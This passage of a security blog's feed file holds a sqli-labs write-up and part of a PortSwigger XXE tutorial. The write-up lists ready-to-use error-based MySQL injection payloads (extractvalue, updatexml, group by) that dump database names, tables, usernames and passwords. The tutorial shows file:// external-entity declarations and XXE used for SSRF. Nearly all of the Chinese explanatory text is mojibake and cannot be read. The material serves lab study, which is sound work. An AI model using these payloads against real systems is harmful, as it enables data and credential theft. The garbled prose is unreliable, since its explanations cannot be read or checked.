keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="4.5" color="#FFFF00">'</span><span class="token punctuation">;</span><span class="token comment">//echo "Bug off you Silly Dumb hacker";</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/slap1.jpg"   />'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Â≠¶Âà∞‰∏âÁßçÊä•ÈîôÊ≥®ÂÖ•Ôºö</p><h3 id="extractvalueÊä•ÈîôÊ≥®ÂÖ•"><a href="#extractvalueÊä•ÈîôÊ≥®ÂÖ•" class="headerlink" title="extractvalueÊä•ÈîôÊ≥®ÂÖ•"></a>extractvalueÊä•ÈîôÊ≥®ÂÖ•</h3><p>extractvalue(XML_document,XPath_string)</p><p>Á¨¨‰∏Ä‰∏™ÂèÇÊï∞ÔºöXML_documentÊòØStringÊ†ºÂºèÔºå‰∏∫XMLÊñáÊ°£ÂØπË±°ÁöÑÂêçÁß∞ÔºåÊñá‰∏≠‰∏∫Doc</p><p>Á¨¨‰∫å‰∏™ÂèÇÊï∞ÔºöXPath_string (XpathÊ†ºÂºèÁöÑÂ≠óÁ¨¶‰∏≤) ÔºåÂ¶ÇÊûú‰∏ç‰∫ÜËß£XpathËØ≠Ê≥ï„ÄÇ</p><p>‰ΩúÁî®Ôºö‰ªéXML_document‰∏≠ÊèêÂèñÁ¨¶ÂêàXPATH_stringÁöÑÂÄºÔºåÂΩìÊàë‰ª¨XPath_stringËØ≠Ê≥ïÊä•ÈîôÊó∂ÂÄôÂ∞±‰ºöÊä•ÈîôÔºå‰∏ãÈù¢ÁöÑËØ≠Ê≥ïÂ∞±ÊòØÈîôËØØÁöÑ„ÄÇconcatÂíågroup_concat‰ΩúÁî®‰∏ÄÊ†∑<code>0x5c</code>ÊòØ<code>\\</code>ÁöÑ16ËøõÂà∂.</p><blockquote><p>1‚Äô and (extractvalue(1,concat(0x5c,version(),0x5c)))#    ÁàÜÁâàÊú¨<br>1‚Äô and (extractvalue(1,concat(0x5c,database(),0x5c)))#   ÁàÜÊï∞ÊçÆÂ∫ì<br>1‚Äô and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x5c)))#   ÁàÜË°®Âêç<br>1‚Äô and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;‚Äôusers‚Äô),0x5c)))#<br>ÁàÜÂ≠óÊÆµÂêç<br>1‚Äô and (extractvalue(1,concat(0x5c,(select password from (select password from users where username&#x3D;‚Äôadmin1‚Äô) b) ,0x5c)))#      ÁàÜÂ≠óÊÆµÂÜÖÂÆπËØ•Ê†ºÂºèÈíàÂØπmysqlÊï∞ÊçÆÂ∫ì„ÄÇ<br>1‚Äô and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))#                      ÁàÜÂ≠óÊÆµÂÜÖÂÆπ„ÄÇ</p></blockquote><p>Âú®ÊúÄÂêé‰∏ÄÊ≠•ÁàÜÂ≠óÊÆµÂÜÖÂÆπÊó∂ÂÄôÔºå‰ºöÊä•ÈîôÔºåÂéüÂõ†ÊòØ<strong>mysqlÊï∞ÊçÆ‰∏çÊîØÊåÅÊü•ËØ¢ÂíåÊõ¥Êñ∞ÊòØÂêå‰∏ÄÂº†Ë°®</strong>„ÄÇÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶ÅÂä†‰∏Ä‰∏™<strong>‰∏≠Èó¥Ë°®„ÄÇ</strong></p><h3 id="updatexmlÊä•ÈîôÊ≥®ÂÖ•"><a href="#updatexmlÊä•ÈîôÊ≥®ÂÖ•" class="headerlink" title="updatexmlÊä•ÈîôÊ≥®ÂÖ•"></a>updatexmlÊä•ÈîôÊ≥®ÂÖ•</h3><p>UPDATEXML (XML_document, XPath_string, new_value)</p><p>Á¨¨‰∏Ä‰∏™ÂèÇÊï∞ÔºöXML_documentÊòØStringÊ†ºÂºèÔºå‰∏∫XMLÊñáÊ°£ÂØπË±°ÁöÑÂêçÁß∞ÔºåÊñá‰∏≠‰∏∫Doc</p><p>Á¨¨‰∫å‰∏™ÂèÇÊï∞ÔºöXPath_string (XpathÊ†ºÂºèÁöÑÂ≠óÁ¨¶‰∏≤) ÔºåÂ¶ÇÊûú‰∏ç‰∫ÜËß£XpathËØ≠Ê≥ïÔºåÂèØ‰ª•Âú®ÁΩë‰∏äÊü•ÊâæÊïôÁ®ã„ÄÇ</p><p>Á¨¨‰∏â‰∏™ÂèÇÊï∞Ôºönew_valueÔºåStringÊ†ºÂºèÔºåÊõøÊç¢Êü•ÊâæÂà∞ÁöÑÁ¨¶ÂêàÊù°‰ª∂ÁöÑÊï∞ÊçÆ</p><p>‰ΩúÁî®ÔºöÊîπÂèòÊñáÊ°£‰∏≠Á¨¶ÂêàÊù°‰ª∂ÁöÑËäÇÁÇπÁöÑÂÄºÔºåÊîπÂèòXML_document‰∏≠Á¨¶ÂêàXPATH_stringÁöÑÂÄº</p><blockquote><p>123‚Äô and (updatexml(1,concat(0x5c,version(),0x5c),1))#     ÁàÜÁâàÊú¨<br>123‚Äô and (updatexml(1,concat(0x5c,database(),0x5c),1))#    ÁàÜÊï∞ÊçÆÂ∫ì</p></blockquote><blockquote><p>123‚Äô and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x5c),1))#      ÁàÜË°®Âêç<br>123‚Äô and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;‚Äôsecurity‚Äô and table_name &#x3D;‚Äôusers‚Äô),0x5c),1))#<br>ÁàÜÂ≠óÊÆµÂêç</p></blockquote><blockquote><p>123‚Äô and (updatexml(1,concat(0x5c,(select password from (select password from users where username&#x3D;‚Äôadmin1‚Äô) b),0x5c),1))#<br>ÁàÜÂØÜÁ†ÅËØ•Ê†ºÂºèÈíàÂØπmysqlÊï∞ÊçÆÂ∫ì„ÄÇ<br>ÁàÜÂÖ∂‰ªñË°®Â∞±ÂèØ‰ª•Ôºå‰∏ãÈù¢ÊòØÁàÜemailsË°®<br>123‚Äô and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;‚Äôsecurity‚Äô and table_name &#x3D;‚Äôemails‚Äô),0x5c),1))#</p></blockquote><blockquote><p>1‚Äô and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))#   ÁàÜÂ≠óÊÆµÂÜÖÂÆπ„ÄÇ</p></blockquote><h3 id="group-byÊä•ÈîôÊ≥®ÂÖ•"><a href="#group-byÊä•ÈîôÊ≥®ÂÖ•" class="headerlink" title="group byÊä•ÈîôÊ≥®ÂÖ•"></a>group byÊä•ÈîôÊ≥®ÂÖ•</h3><blockquote><p>123‚Äô and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)<em>2)))#     ÁàÜÊï∞ÊçÆÂ∫ì<br>123‚Äô and (select count(</em>) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#      ÁàÜÊï∞ÊçÆÂ∫ìÁâàÊú¨</p></blockquote><blockquote><p>1‚Äô and (select count(*) from information_schema.tables where table_schema&#x3D;database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),0x7e,floor(rand(0)<em>2)))#    ÈÄöËøá‰øÆÊîπlimitÂêéÈù¢Êï∞Â≠ó‰∏Ä‰∏™‰∏Ä‰∏™ÁàÜË°®<br>1‚Äô and (select count(</em>) from information_schema.tables where table_schema&#x3D;database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e,floor(rand(0)*2)))#        ÁàÜÂá∫ÊâÄÊúâË°®</p></blockquote><blockquote><p>1‚Äô and (select count(*) from information_schema.columns where table_schema&#x3D;database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;‚Äôusers‚Äô),0x7e,floor(rand(0)<em>2)))#    ÁàÜÂá∫ÊâÄÊúâÂ≠óÊÆµÂêç<br>1‚Äô and (select count(</em>) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#    ÁàÜÂá∫ÊâÄÊúâÂ≠óÊÆµÂêç</p></blockquote><blockquote><p>1‚Äô and (select 1 from(select count(*) from information_schema.columns where table_schema&#x3D;database() group by concat(0x7e,(select password from users where username&#x3D;‚Äôadmin1‚Äô),0x7e,floor(rand(0)*2)))a)#    ÁàÜÂá∫ËØ•Ë¥¶Êà∑ÁöÑÂØÜÁ†Å„ÄÇ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PortSwigger-XXE</title>
      <link href="/2023/03/11/PortSwigger-XXE/"/>
      <url>/2023/03/11/PortSwigger-XXE/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="‰ªÄ‰πàÊòØ-XML-Â§ñÈÉ®ÂÆû‰ΩìÊ≥®ÂÖ•Ôºü"><a href="#‰ªÄ‰πàÊòØ-XML-Â§ñÈÉ®ÂÆû‰ΩìÊ≥®ÂÖ•Ôºü" class="headerlink" title="‰ªÄ‰πàÊòØ XML Â§ñÈÉ®ÂÆû‰ΩìÊ≥®ÂÖ•Ôºü"></a>‰ªÄ‰πàÊòØ XML Â§ñÈÉ®ÂÆû‰ΩìÊ≥®ÂÖ•Ôºü</h2><p>XML Â§ñÈÉ®ÂÆû‰ΩìÊ≥®ÂÖ•Ôºà‰πüÁß∞‰∏∫ XXEÔºâÊòØ‰∏ÄÁßç Web ÂÆâÂÖ®ÊºèÊ¥ûÔºåÂÖÅËÆ∏ÊîªÂáªËÄÖÂπ≤Êâ∞Â∫îÁî®Á®ãÂ∫èÂØπ XML Êï∞ÊçÆÁöÑÂ§ÑÁêÜ„ÄÇÂÆÉÈÄöÂ∏∏ÂÖÅËÆ∏ÊîªÂáªËÄÖÊü•ÁúãÂ∫îÁî®Á®ãÂ∫èÊúçÂä°Âô®Êñá‰ª∂Á≥ªÁªü‰∏äÁöÑÊñá‰ª∂ÔºåÂπ∂‰∏éÂ∫îÁî®Á®ãÂ∫èÊú¨Ë∫´ÂèØ‰ª•ËÆøÈóÆÁöÑ‰ªª‰ΩïÂêéÁ´ØÊàñÂ§ñÈÉ®Á≥ªÁªüËøõË°å‰∫§‰∫í„ÄÇ</p><p>Âú®Êüê‰∫õÊÉÖÂÜµ‰∏ãÔºåÊîªÂáªËÄÖÂèØ‰ª•Âà©Áî® XXE ÊºèÊ¥ûÊâßË°åÊúçÂä°Âô®Á´ØËØ∑Ê±Ç‰º™ÈÄ†(SSRF) ÊîªÂáªÔºå‰ªéËÄåÂçáÁ∫ß XXE ÊîªÂáª‰ª•Á†¥ÂùèÂ∫ïÂ±ÇÊúçÂä°Âô®ÊàñÂÖ∂‰ªñÂêéÁ´ØÂü∫Á°ÄËÆæÊñΩ„ÄÇ</p><h2 id="XXEÊºèÊ¥ûÊòØÂ¶Ç‰Ωï‰∫ßÁîüÁöÑÔºü"><a href="#XXEÊºèÊ¥ûÊòØÂ¶Ç‰Ωï‰∫ßÁîüÁöÑÔºü" class="headerlink" title="XXEÊºèÊ¥ûÊòØÂ¶Ç‰Ωï‰∫ßÁîüÁöÑÔºü"></a>XXEÊºèÊ¥ûÊòØÂ¶Ç‰Ωï‰∫ßÁîüÁöÑÔºü</h2><p>‰∏Ä‰∫õÂ∫îÁî®Á®ãÂ∫è‰ΩøÁî® XML Ê†ºÂºèÂú®ÊµèËßàÂô®ÂíåÊúçÂä°Âô®‰πãÈó¥‰º†ËæìÊï∞ÊçÆ„ÄÇÊâßË°åÊ≠§Êìç‰ΩúÁöÑÂ∫îÁî®Á®ãÂ∫èÂÆûÈôÖ‰∏äÊÄªÊòØ‰ΩøÁî®Ê†áÂáÜÂ∫ìÊàñÂπ≥Âè∞ API Êù•Â§ÑÁêÜÊúçÂä°Âô®‰∏äÁöÑ XML Êï∞ÊçÆ„ÄÇXXE ÊºèÊ¥ûÁöÑÂá∫Áé∞ÊòØÂõ†‰∏∫ XML ËßÑËåÉÂåÖÂê´ÂêÑÁßçÊΩúÂú®Âç±Èô©ÁöÑÁâπÊÄßÔºåËÄåÊ†áÂáÜËß£ÊûêÂô®ÊîØÊåÅËøô‰∫õÁâπÊÄßÔºåÂç≥‰ΩøÂÆÉ‰ª¨ÈÄöÂ∏∏‰∏çË¢´Â∫îÁî®Á®ãÂ∫è‰ΩøÁî®„ÄÇ<br>XML Â§ñÈÉ®ÂÆû‰ΩìÊòØ‰∏ÄÁßçËá™ÂÆö‰πâ XML ÂÆû‰ΩìÔºåÂÖ∂ÂÆö‰πâÁöÑÂÄºÊòØ‰ªéÂ£∞ÊòéÂÆÉ‰ª¨ÁöÑ DTD Â§ñÈÉ®Âä†ËΩΩÁöÑ„ÄÇ‰ªéÂÆâÂÖ®ËßíÂ∫¶Êù•ÁúãÔºåÂ§ñÈÉ®ÂÆû‰ΩìÁâπÂà´ÊúâË∂£ÔºåÂõ†‰∏∫ÂÆÉ‰ª¨ÂÖÅËÆ∏Ê†πÊçÆÊñá‰ª∂Ë∑ØÂæÑÊàñ URL ÁöÑÂÜÖÂÆπÂÆö‰πâÂÆû‰Ωì„ÄÇ</p><h2 id="XMLÂÆû‰Ωì"><a href="#XMLÂÆû‰Ωì" class="headerlink" title="XMLÂÆû‰Ωì"></a>XMLÂÆû‰Ωì</h2><h3 id="‰ªÄ‰πàÊòØXMLÔºü"><a href="#‰ªÄ‰πàÊòØXMLÔºü" class="headerlink" title="‰ªÄ‰πàÊòØXMLÔºü"></a>‰ªÄ‰πàÊòØXMLÔºü</h3><p>XML ‰ª£Ë°®‚ÄúÂèØÊâ©Â±ïÊ†áËÆ∞ËØ≠Ë®Ä‚Äù„ÄÇXML ÊòØ‰∏ÄÁßçËÆæËÆ°Áî®‰∫éÂ≠òÂÇ®Âíå‰º†ËæìÊï∞ÊçÆÁöÑËØ≠Ë®Ä„ÄÇ‰∏é HTML ‰∏ÄÊ†∑ÔºåXML ‰ΩøÁî®Ê†ëÁä∂ÁªìÊûÑÁöÑÊ†áËÆ∞ÂíåÊï∞ÊçÆ„ÄÇ‰∏é HTML ‰∏çÂêåÔºåXML ‰∏ç‰ΩøÁî®È¢ÑÂÆö‰πâÁöÑÊ†áÁ≠æÔºåÂõ†Ê≠§ÂèØ‰ª•‰∏∫Ê†áÁ≠æÊåáÂÆöÊèèËø∞Êï∞ÊçÆÁöÑÂêçÁß∞„ÄÇÂú®ÁΩëÁªúÂéÜÂè≤ÁöÑÊó©ÊúüÔºåXML ‰Ωú‰∏∫‰∏ÄÁßçÊï∞ÊçÆ‰º†ËæìÊ†ºÂºèÂæàÊµÅË°åÔºà‚ÄúAJAX‚Äù‰∏≠ÁöÑ‚ÄúX‚Äù‰ª£Ë°®‚ÄúXML‚ÄùÔºâ„ÄÇ‰ΩÜÂÆÉÁöÑÂèóÊ¨¢ËøéÁ®ãÂ∫¶Áé∞Âú®Â∑≤Áªè‰∏ãÈôçÔºåÂèñËÄå‰ª£‰πãÁöÑÊòØ JSON Ê†ºÂºè„ÄÇ</p><h3 id="‰ªÄ‰πàÊòØ-XML-ÂÆû‰ΩìÔºü"><a href="#‰ªÄ‰πàÊòØ-XML-ÂÆû‰ΩìÔºü" class="headerlink" title="‰ªÄ‰πàÊòØ XML ÂÆû‰ΩìÔºü"></a>‰ªÄ‰πàÊòØ XML ÂÆû‰ΩìÔºü</h3><p>XML ÂÆû‰ΩìÊòØ‰∏ÄÁßçÂú® XML ÊñáÊ°£‰∏≠Ë°®Á§∫Êï∞ÊçÆÈ°πÁöÑÊñπÂºèÔºåËÄå‰∏çÊòØ‰ΩøÁî®Êï∞ÊçÆÊú¨Ë∫´„ÄÇXML ËØ≠Ë®ÄËßÑËåÉ‰∏≠ÂÜÖÁΩÆ‰∫ÜÂêÑÁßçÂÆû‰Ωì„ÄÇ‰æãÂ¶ÇÔºåÂÆû‰Ωì<code>&amp;lt;</code>Âíå<code>&amp;gt;</code>Ë°®Á§∫Â≠óÁ¨¶&lt;Âíå&gt;„ÄÇËøô‰∫õÊòØÁî®‰∫éË°®Á§∫ XML Ê†áËÆ∞ÁöÑÂÖÉÂ≠óÁ¨¶ÔºåÂõ†Ê≠§ÂΩìÂÆÉ‰ª¨Âá∫Áé∞Âú®Êï∞ÊçÆ‰∏≠Êó∂ÔºåÈÄöÂ∏∏ÂøÖÈ°ª‰ΩøÁî®ÂÆÉ‰ª¨ÁöÑÂÆû‰ΩìÊù•Ë°®Á§∫„ÄÇ</p><h3 id="‰ªÄ‰πàÊòØÊñáÊ°£Á±ªÂûãÂÆö‰πâÔºü"><a href="#‰ªÄ‰πàÊòØÊñáÊ°£Á±ªÂûãÂÆö‰πâÔºü" class="headerlink" title="‰ªÄ‰πàÊòØÊñáÊ°£Á±ªÂûãÂÆö‰πâÔºü"></a>‰ªÄ‰πàÊòØÊñáÊ°£Á±ªÂûãÂÆö‰πâÔºü</h3><p>XML ÊñáÊ°£Á±ªÂûãÂÆö‰πâ (DTD) ÂåÖÂê´ÂèØ‰ª•ÂÆö‰πâ XML ÊñáÊ°£ÁöÑÁªìÊûÑ„ÄÅÂÆÉÂèØ‰ª•ÂåÖÂê´ÁöÑÊï∞ÊçÆÂÄºÁöÑÁ±ªÂûã‰ª•ÂèäÂÖ∂‰ªñÈ°πÁõÆÁöÑÂ£∞Êòé„ÄÇDTD Âú®DOCTYPEXML ÊñáÊ°£ÂºÄÂ§¥ÁöÑÂèØÈÄâÂÖÉÁ¥†‰∏≠Â£∞Êòé„ÄÇDTD ÂèØ‰ª•ÂÆåÂÖ®Áã¨Á´ã‰∫éÊñáÊ°£Êú¨Ë∫´ÔºàÁß∞‰∏∫‚ÄúÂÜÖÈÉ® DTD‚ÄùÔºâÔºå‰πüÂèØ‰ª•‰ªéÂÖ∂‰ªñÂú∞ÊñπÂä†ËΩΩÔºàÁß∞‰∏∫‚ÄúÂ§ñÈÉ® DTD‚ÄùÔºâÔºåÊàñËÄÖÂèØ‰ª•ÊòØ‰∏§ËÄÖÁöÑÊ∑∑Âêà„ÄÇ</p><h3 id="‰ªÄ‰πàÊòØ-XML-Ëá™ÂÆö‰πâÂÆû‰ΩìÔºü"><a href="#‰ªÄ‰πàÊòØ-XML-Ëá™ÂÆö‰πâÂÆû‰ΩìÔºü" class="headerlink" title="‰ªÄ‰πàÊòØ XML Ëá™ÂÆö‰πâÂÆû‰ΩìÔºü"></a>‰ªÄ‰πàÊòØ XML Ëá™ÂÆö‰πâÂÆû‰ΩìÔºü</h3><p>XML ÂÖÅËÆ∏Âú® DTD ‰∏≠ÂÆö‰πâËá™ÂÆö‰πâÂÆû‰Ωì„ÄÇ‰æãÂ¶ÇÔºö</p><blockquote><p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY myentity &quot;my entity value&quot; &gt; ]&gt;</code><br>Ê≠§ÂÆö‰πâÊÑèÂë≥ÁùÄ XML ÊñáÊ°£‰∏≠ÂØπÂÆû‰ΩìÂºïÁî®ÁöÑ‰ªª‰Ωï‰ΩøÁî®ÈÉΩ&amp;myentity;Â∞ÜÊõøÊç¢‰∏∫ÂÆö‰πâÁöÑÂÄºÔºö‚Äú my entity value‚Äù„ÄÇ</p></blockquote><h3 id="‰ªÄ‰πàÊòØ-XML-Â§ñÈÉ®ÂÆû‰ΩìÔºü"><a href="#‰ªÄ‰πàÊòØ-XML-Â§ñÈÉ®ÂÆû‰ΩìÔºü" class="headerlink" title="‰ªÄ‰πàÊòØ XML Â§ñÈÉ®ÂÆû‰ΩìÔºü"></a>‰ªÄ‰πàÊòØ XML Â§ñÈÉ®ÂÆû‰ΩìÔºü</h3><p>XML Â§ñÈÉ®ÂÆû‰ΩìÊòØ‰∏ÄÁßçËá™ÂÆö‰πâÂÆû‰ΩìÔºåÂÖ∂ÂÆö‰πâ‰Ωç‰∫éÂ£∞ÊòéÂÆÉ‰ª¨ÁöÑ DTD ‰πãÂ§ñ„ÄÇ</p><p>Â§ñÈÉ®ÂÆû‰ΩìÁöÑÂ£∞Êòé‰ΩøÁî®ÂÖ≥ÈîÆÂ≠óSYSTEMÔºåÂπ∂‰∏îÂøÖÈ°ªÊåáÂÆöÂ∫î‰ªé‰∏≠Âä†ËΩΩÂÆû‰ΩìÂÄºÁöÑ URL„ÄÇ‰æãÂ¶ÇÔºö</p><blockquote><p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;http://normal-website.com&quot; &gt; ]&gt;</code><br>URL ÂèØ‰ª•‰ΩøÁî®ËØ•file:&#x2F;&#x2F;ÂçèËÆÆÔºåÂõ†Ê≠§ÂèØ‰ª•‰ªéÊñá‰ª∂Âä†ËΩΩÂ§ñÈÉ®ÂÆû‰Ωì„ÄÇ‰æãÂ¶ÇÔºö</p></blockquote><blockquote><p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; ]&gt;</code></p></blockquote><h2 id="Âà©Áî®XXEÊâßË°åSSRFÊîªÂáª"><a href="#Âà©Áî®XXEÊâßË°åSSRFÊîªÂáª" class="headerlink" title="Âà©Áî®XXEÊâßË°åSSRFÊîªÂáª"></a>Âà©Áî®XXEÊâßË°åSSRFÊîªÂáª</h2><p><img src="https://img-blog.csdnimg.cn/61f07784b7f245fd8f31186f0f1043f3.png" alt="1">ËøõÂÖ•ÁΩëÁ´ôÂú®<strong>Ê£ÄÊü•ÂïÜÂ∫óÂïÜÂ∫ó</strong>Êó∂ÔºåÁΩëÁ´ôÊèê‰∫§‰∫ÜPOSTËØ∑Ê±ÇÔºåÊâìÂºÄ‰πãÂêéÁúãÂà∞ÊúâXML<br><img src="https://img-blog.csdnimg.cn/6afd2b71181c40dca1a5c0ca2efe8f27.png" alt="1"><br>‰∏çÂ¶®ÊûÑÈÄ†XXE„ÄÇ</p><p><img src="https://img-blog.csdnimg.cn/3a23d819d8834ca6aee716adc370b6f6.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/ea03a4027ab14aa79ec1121e48d6c6f0.png" alt="3"><br>Ë∑üÁùÄ‰ªñËØ¥ÁöÑ‰æùÊ¨°ËÆøÈóÆÔºåÁõ¥Âà∞ÊâæÂà∞ACCESSkeyid<br><img src="https://img-blog.csdnimg.cn/9fc4a18f08df4f498ec23ab9850abc09.png" alt="5"></p><h2 id="XincludeÊäÄÊúØ"><a href="#XincludeÊäÄÊúØ" class="headerlink" title="XincludeÊäÄÊúØ"></a>XincludeÊäÄÊúØ</h2><p>XInclude ÊòØ‰∏ÄÁßçÊîØÊåÅÂ∞ÜÂ§ö‰∏™ XML ÊñáÊ°£‰∏≠ÁöÑÂÜÖÂÆπÂåÖÂê´Âú®Âçï‰∏™ XML ÊñáÊ°£‰∏≠ÁöÑÊäÄÊúØ„ÄÇÂÆÉÊòØ XML ÊäÄÊúØÂÆ∂ÊóèÁöÑ‰∏ÄÈÉ®ÂàÜÔºåÊó®Âú®ÁÆÄÂåñÂ§ßÂûã XML ÊñáÊ°£ÁöÑÂàõÂª∫ÂíåÁÆ°ÁêÜ„ÄÇ</p><p>‰ΩøÁî® XIncludeÔºåÊÇ®ÂèØ‰ª•ÂàõÂª∫‰∏Ä‰∏™‚Äú‰∏ª‚ÄùXML ÊñáÊ°£ÔºåËØ•ÊñáÊ°£Â∞ÜÂÖ∂‰ªñ XML ÊñáÊ°£‰Ωú‰∏∫‚ÄúÂ≠êÊñáÊ°£‚ÄùÂºïÁî®„ÄÇËøô‰∫õÂ≠êÊñáÊ°£ÂèØ‰ª•ÊåâÂÄºÊàñÂºïÁî®ÂåÖÂê´Âú®ÂÜÖÔºåÁîüÊàêÁöÑ‰∏ªÊéßÊñáÊ°£ÂèØ‰ª•Áî®‰ΩúÁã¨Á´ãÁöÑ XML ÊñáÊ°£„ÄÇ</p><p>XInclude ‰ΩøÁî® XML ÂëΩÂêçÁ©∫Èó¥ÔºåÂÖ∂ÂÆö‰πâÂ¶Ç‰∏ãÔºö</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">xmlns:xi="http://www.w3.org/2001/XInclude"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>XInclude ÊîØÊåÅ‰∏§ÁßçÁ±ªÂûãÁöÑÂåÖÂê´ÔºöÊåâÂºïÁî®ÂåÖÂê´ÂíåÊåâÂÄºÂåÖÂê´„ÄÇÂΩìÊÇ®Â∏åÊúõÂ∞ÜÂ§ñÈÉ®ÊñáÊ°£‰Ωú‰∏∫ URI ÂåÖÂê´Êó∂ÔºåÂ∞Ü‰ΩøÁî®ÊåâÂºïÁî®ÂåÖÂê´ÔºåËÄåÂΩìÊÇ®Â∏åÊúõÂåÖÂê´Â§ñÈÉ®ÊñáÊ°£ÁöÑÂÆûÈôÖÂÜÖÂÆπÊó∂ÔºåÂàô‰ΩøÁî®ÊåâÂÄºÂåÖÂê´„ÄÇ</p><p>‰∏ãÈù¢ÊòØ‰∏Ä‰∏™ÂåÖÂê´Â§ñÈÉ®ÊñáÊ°£ÁöÑ XInclude ËØ≠Âè•Á§∫‰æãÔºåËØ•ËØ≠Âè•‰ΩøÁî®ÊåâÂºïÁî®ÂåÖÂê´Ôºö</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xi:</span>include</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>external.xml<span class="token punctuation">"</span></span> <span class="token attr-name">parse</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xml<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>‰∏ãÈù¢ÊòØ‰∏Ä‰∏™ÂåÖÂê´Â§ñÈÉ®ÊñáÊ°£ÁöÑ XInclude ËØ≠Âè•Á§∫‰æãÔºåËØ•ËØ≠Âè•‰ΩøÁî® include-by-valueÔºö</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xi:</span>include</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>external.xml<span class="token punctuation">"</span></span> <span class="token attr-name">parse</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>XInclude ÂèØ‰ª•‰∏é‰ªª‰Ωï XML ÊñáÊ°£‰∏ÄËµ∑‰ΩøÁî®ÔºåÂπ∂‰∏îÂÆÉÂèóÂà∞ XML Ëß£ÊûêÂô®ÂíåÁºñËæëÂô®ÁöÑÂπøÊ≥õÊîØÊåÅ„ÄÇÂÆÉËÉΩÂ§üÁÆÄÂåñÂ§ßÂûã XML ÊñáÊ°£ÁöÑÂàõÂª∫ÂíåÁÆ°ÁêÜÔºå‰ΩøÂÖ∂Êàê‰∏∫ÂºÄÂèë‰∫∫ÂëòÂíåÂÜÖÂÆπÂàõÂª∫ËÄÖÁöÑÂÆùË¥µÂ∑•ÂÖ∑„ÄÇ</p><p>‰∏Ä‰∫õÂ∫îÁî®Á®ãÂ∫èÊé•Êî∂ÂÆ¢Êà∑Á´ØÊèê‰∫§ÁöÑÊï∞ÊçÆÔºåÂú®ÊúçÂä°Âô®Á´ØÂ∞ÜÂÖ∂ÂµåÂÖ•Âà∞ XML ÊñáÊ°£‰∏≠ÔºåÁÑ∂ÂêéËß£ÊûêËØ•ÊñáÊ°£„ÄÇÂΩìÂÆ¢Êà∑Á´ØÊèê‰∫§ÁöÑÊï∞ÊçÆË¢´ÊîæÂÖ•ÂêéÁ´Ø SOAP ËØ∑Ê±ÇÔºåÁÑ∂ÂêéÁî±ÂêéÁ´Ø SOAP 